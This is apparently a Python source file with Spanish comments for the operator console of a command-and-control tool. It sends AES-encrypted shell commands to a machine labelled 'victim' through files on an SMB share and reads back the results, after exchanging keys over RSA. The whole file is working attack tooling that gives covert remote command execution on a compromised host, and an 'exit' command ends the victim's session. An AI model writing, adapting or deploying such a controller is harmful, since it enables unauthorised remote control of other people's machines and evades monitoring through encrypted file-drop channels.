import tempfile, os, time
from smb.SMBConnection import SMBConnection # type: ignore
from cryptography.hazmat.primitives import serialization, asymmetric, hashes # type: ignore
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
from cryptography.hazmat.primitives import padding # type: ignore
from cryptography.hazmat.backends import default_backend # type: ignore
import base64
import configparser  # Usaremos configparser para manejar .env como un archivo de configuración
import signal
import sys
import readline
import chardet

# Configuración de los archivos utilizados
command_file_name = "command.txt"  # Nombre del archivo de comandos
response_file_name = "result.txt"  # Nombre del archivo de respuestas
symetric_key_file_name = "pass.txt" # Nombre del archivo de la clave simetrica
public_key_file_name = "a.pub"  # Nombre del archivo de la clave pública

# Configuración de la conexión SMB
smb_user = "smbuser"  # Usuario SMB
smb_pass = "smbpass"  # Contraseña SMB
smb_address = "127.0.0.1"  # Dirección IP del servidor SMB
smb_client_machine_name = "server"  # Nombre de la máquina cliente
smb_server_name = "victim"  # Nombre de la máquina servidor
smb_domain_name = "WORKGROUP"  # Nombre del dominio SMB
smb_use_ntlm_v2 = True  # Usar NTLMv2 para autenticación
smb_port = 445  # Puerto SMB
shared_folder = "shared"  # Nombre del recurso compartido
file_path = "example_folder/"  # Definir la ruta en el recurso compartido

# Otras configuraciones
sleep_time = 5  # Tiempo de espera entre comprobaciones de archivos en SMB

# Función para mostrar mensaje de carga
def mostrar_carga(tiempo):
    carga = ["", ".", "..", "..."]  # Animación de puntos suspensivos
    fin = time.time() + tiempo
    while time.time() < fin:
        for estado in carga:
            sys.stdout.write(f"\rCargando{estado}                                  ")  # Escribe en la misma línea
            sys.stdout.flush()  # Actualiza la salida inmediatamente
            time.sleep(0.5)  # Cambia el estado cada 0.5 segundos
    sys.stdout.write("\r                                  \r") # Limpia y muestra mensaje final

# Función para guardar las variables en el archivo .env
def save_env(symetric_key, private_key_pem):
    config = configparser.ConfigParser()
    config['SESSION'] = {
        'SYMMETRIC_KEY': symetric_key,
        'PRIVATE_KEY': private_key_pem.decode('utf-8')  # Convertir a texto si es bytes
    }
    with open('.env', 'w') as configfile:
        config.write(configfile)

# Función para eliminar la clave simétrica del archivo .env
def delete_symmetric_key_from_env():
    config = configparser.ConfigParser()
    config.read('.env')
    if 'SESSION' in config and 'SYMMETRIC_KEY' in config['SESSION']:
        del config['SESSION']['SYMMETRIC_KEY']  # Eliminar la clave simétrica
        with open('.env', 'w') as configfile:
            config.write(configfile)
        print("Clave simétrica eliminada del .env.")
    else:
        print("No se encontró una clave simétrica en el .env.")

# Función para configurar la conexión SMB
def setup_server():
    conn = SMBConnection(smb_user, smb_pass, smb_client_machine_name, smb_server_name, domain=smb_domain_name, use_ntlm_v2=smb_use_ntlm_v2)
    conn.connect(smb_address, smb_port)
    return conn

# Función para verificar si un archivo existe en el recurso compartido
def check_if_file_exists(conn, filename):
    try:
        file_attributes = conn.getAttributes(shared_folder, file_path + filename)
        return True  # El archivo existe
    except:
        return False  # El archivo no existe

# Función para borrar un archivo del recurso compartido
def delete_file_from_smb(conn, filename):
    conn.deleteFiles(shared_folder, file_path + filename)

# Función para escribir un archivo en el recurso compartido
def write_to_smb(conn, filename, content):
    # Crear un archivo temporal
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        temp_file.write(content.encode())  # Escribir contenido en el archivo temporal
        temp_filename = temp_file.name  # Obtener el nombre del archivo temporal

    # Subir el archivo al recurso compartido
    with open(temp_filename, 'rb') as temp_file:
        conn.storeFile(shared_folder, file_path + filename, temp_file)  # Usar storeFile para subir

    # Eliminar el archivo temporal
    os.remove(temp_filename)

# Función para leer un archivo del recurso compartido
def read_from_smb(conn, filename):
    # Crear un archivo temporal para almacenar el archivo descargado
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        local_filename = temp_file.name  # Obtener el nombre del archivo temporal

    # Descargar el archivo desde SMB
    with open(local_filename, 'wb') as local_file:
        conn.retrieveFile(shared_folder, file_path + filename, local_file)  # Descargar el archivo desde SMB

    # Leer el archivo descargado
    with open(local_filename, 'rb') as f:
        return f.read()

    # Eliminar el archivo temporal
    os.remove(local_filename)

# Función para cifrar un mensaje con AES
def encrypt_with_symmetric_key(key, plaintext):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(plaintext) + padder.finalize()
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(iv + ciphertext).decode('utf-8')

# Función para descifrar un mensaje con AES
def decrypt_with_symmetric_key(key, ciphertext_base64):
    ciphertext_with_iv = base64.b64decode(ciphertext_base64)
    iv = ciphertext_with_iv[:16]
    ciphertext = ciphertext_with_iv[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    decryptor = cipher.decryptor()
    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
    return plaintext.decode(chardet.detect(plaintext)['encoding'] or 'utf-8')

# Generar un par de claves RSA (clave pública y clave privada)
def generate_rsa_keys(private_key):
    if not private_key:
        # Generar una clave privada
        private_key = asymmetric.rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,  # Tamaño de la clave, 2048 bits es común
        )

    # Generar la clave pública correspondiente a la clave privada
    public_key = private_key.public_key()

    return private_key, public_key

# Guardar la clave privada en un archivo temporal
def save_private_key_temp(private_key):
    temp_private = tempfile.NamedTemporaryFile(delete=False)
    temp_private.write(
        private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
    )
    temp_private.close()
    return temp_private.name

# Guardar la clave pública en un archivo temporal
def save_public_key_temp(public_key):
    temp_public = tempfile.NamedTemporaryFile(delete=False)
    temp_public.write(
        public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
    )
    temp_public.close()
    return temp_public.name

# Cargar la clave privada desde un archivo PEM
def load_private_key(private_key_pem):
    return serialization.load_pem_private_key(private_key_pem, password=None)

# Función para descifrar un mensaje con la clave privada
def decrypt_with_private_key(private_key, ciphertext):
    plaintext = private_key.decrypt(
        ciphertext,
        asymmetric.padding.OAEP(
            mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext.decode()  # Decodificar el mensaje descifrado

# Función para cargar las variables desde el archivo .env
def load_env():
    config = configparser.ConfigParser()
    config.read('.env')
    if 'SESSION' in config:
        if 'SYMMETRIC_KEY' in config['SESSION']:
            symetric_key = config['SESSION']['SYMMETRIC_KEY']
        else:
            symetric_key = None
        if 'PRIVATE_KEY' in config['SESSION']:
            private_key_pem = config['SESSION']['PRIVATE_KEY'].encode('utf-8')  # Convertir de texto a bytes
        else:
            private_key_pem = None
        return symetric_key, private_key_pem
    return None, None

# Funcion para cerrar con ctrl+c
def handle_ctrl_c(signal_received, frame):
    print("\n\033[31mSesión guardada y terminada.\033[0m")
    save_env(symetric_key, private_key_pem)
    sys.exit(0)  # Terminar el programa de forma segura

# Asociar la señal SIGINT (Ctrl+C) a la función personalizada
signal.signal(signal.SIGINT, handle_ctrl_c)

def main():
    global symetric_key, private_key_pem
    conn = setup_server()

    # Intentar cargar sesión previa desde el .env
    symetric_key, private_key_pem = load_env()
    response = 'n'
    if symetric_key:
        while True:
            response = input("\033[1;33mSesión previa detectada, desea restaurarla? [y/n/b]\033[0m ").lower()
            if response in ['y', 'n', 'b']:
                break
            print("\033[1;31mPor favor, introduzca 'y' para sí, 'n' para no o b para guardar un backup del .env como .env_old.\033[0m")
    if response == 'b':
        # move .env a .env_old
        original_file = '.env'
        backup_file = '.env_old'

        if not os.path.exists(original_file):
            print("\033[31mEl archivo .env no existe.\033[0m")
            sys.exit(0)

        if os.path.exists(backup_file):
            # Confirmar sobrescritura si .env_old ya existe
            while True:
                confirmation = input("\033[33mEl archivo .env_old ya existe. ¿Desea sobrescribirlo? [y/n]: \033[0m").lower()
                if confirmation in ['y', 'n']:
                    break
                print("\033[31mPor favor, introduzca 'y' para sí o 'n' para no.\033[0m")
            
            if confirmation == 'n':
                print("\033[31mOperación cancelada.\033[0m")
                sys.exit(0)

        try:
            os.rename(original_file, backup_file)
            print(f"\033[32mArchivo renombrado exitosamente de {original_file} a {backup_file}.\033[0m")
        except Exception as e:
            print(f"\033[31mError al renombrar el archivo: {e}\033[0m")
        response = 'n'
    if response == 'n':
        # Cargar o generar claves RSA
        private_key = None
        if private_key_pem:
            private_key = load_private_key(private_key_pem)  # Cargar la clave privada desde bytes
        private_key, public_key = generate_rsa_keys(private_key)  # Generar nuevas claves
        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )

        # Guardar la clave privada temporalmente y subir la pública al servidor
        save_private_key_temp(private_key)
        write_to_smb(conn, public_key_file_name, public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode())

        # Esperar la clave simétrica
        while True:
            if check_if_file_exists(conn, symetric_key_file_name):
                ciphertext = read_from_smb(conn, symetric_key_file_name)
                delete_file_from_smb(conn, symetric_key_file_name)

                try:
                    symetric_key = decrypt_with_private_key(private_key, ciphertext)
                    save_env(symetric_key, private_key_pem)
                    break
                except Exception as e:
                    print(f"\033[31mError al descifrar la clave simétrica: {e}\033[0m")
            time.sleep(sleep_time)

    # Loop principal de comandos
    while True:
        try:
            command = input("\033[34mSMB> \033[0m")
            if command.lower() == "quit":
                save_env(symetric_key, private_key_pem)
                print("\033[31mSesión guardada y terminada.\033[0m")
                break
            elif command.lower() == "help":
                print("Comandos disponibles:")
                print("  help        - Mostrar esta ayuda.")
                print("  quit        - Cerrar la sesión local.")
                print("  exit        - Cerrar la sesión de la víctima.")
            else:
                write_to_smb(conn, command_file_name, encrypt_with_symmetric_key(symetric_key.encode('utf-8'), command.encode('utf-8')))
                mostrar_carga(sleep_time)
                if check_if_file_exists(conn, response_file_name):
                    response = decrypt_with_symmetric_key(symetric_key.encode('utf-8'), read_from_smb(conn, response_file_name))
                    delete_file_from_smb(conn, response_file_name)
                    print(response)
                else:
                    if command.lower() == "exit":
                        delete_symmetric_key_from_env()
                        print("\033[31mSesión terminada.\033[0m")
                        break
                    print('\033[31mRespuesta no recibida. Se volverá a probar en {} segundos.\033[0m'.format(sleep_time))
                    mostrar_carga(sleep_time)
                    if check_if_file_exists(conn, response_file_name):
                        response = decrypt_with_symmetric_key(symetric_key.encode('utf-8'), read_from_smb(conn, response_file_name))
                        delete_file_from_smb(conn, response_file_name)
                        print(response)
                    else:
                        print("\033[31mRespuesta no recibida por 2a vez\033[0m")
                    
        except Exception as e:
            print(f"\033[31mError en el servidor: {e}\033[0m")
    
    conn.close()



if __name__ == "__main__":
    main()
